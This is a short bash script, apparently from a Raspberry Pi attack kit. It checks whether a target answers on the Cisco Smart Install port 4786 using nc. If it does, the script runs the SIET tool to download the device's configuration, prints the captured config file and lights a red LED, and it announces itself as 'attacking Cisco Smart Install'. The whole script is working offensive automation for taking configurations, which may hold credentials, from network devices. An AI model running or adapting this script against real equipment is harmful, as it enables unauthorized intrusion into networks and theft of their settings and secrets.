#!/bin/bash

WAIT=2
DPORT=4786
HOME='/home/pi'
#https://github.com/Sab0tag3d/SIET

if nc -nw $WAIT $1 $DPORT < /dev/null 2> /dev/null; then
	echo '[*] attacking Cisco Smart Install'
	$HOME/src/SIET/siet.py -i $1 -g
	if [ -s "$HOME/src/SIET/conf/$1.conf" ]; then
		cat "$HOME/src/SIET/conf/$1.conf"
		led red on 2> /dev/null
	fi
fi